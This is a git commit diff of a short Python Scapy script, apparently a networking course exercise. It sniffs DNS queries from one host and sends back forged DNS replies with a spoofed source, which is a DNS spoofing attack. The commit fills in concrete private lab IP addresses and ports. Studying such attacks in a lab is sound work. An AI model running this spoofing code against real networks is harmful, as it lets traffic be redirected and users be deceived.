2653caf5fcfc1d5ecdead6f8a6c2d5709907fdfb
BenGanon <92310078+Ben-Ganon@users.noreply.github.com>
2022-05-29 18:37:03 +0300

    updated ip's and ports

--- ex1.py
+++ ex1.py
@@ -11,14 +11,13 @@ import sys
 packet_filt = " and ".join([
     "udp dst port 53", # dns port filtering
     "udp[10] & 0x80 = 0", # dns only
-    "src host 192.168.86.25" # ip source
+    "src host 192.168.59.3" # ip source
     ])
 
 def dns_reply(packet):
-    send(IP(dst="A IP", src="ROUTER IP")/UDP(dport="A PORT", sport="ROUTER PORT")/DNS(id=packet[DNS].id, rd=0, qr=1, aa=1, qtype = 1, qclass = 1, qname = packet.qname))
+    send(IP(dst="192.168.59.3", src="192.168.59.3")/UDP(dport="53", sport="53")/DNS(id=packet[DNS].id, rd=0, qr=1, aa=1, qtype = 1, qclass = 1, qname = packet.qname))
 
 
-packets = rdpcap("test.pcap")
 capture = sniff(filter = packet_filt, store=0, prn = dns_reply, count=0,timeout=10, started_callback = lambda x:print("started sniffing"))
 
 
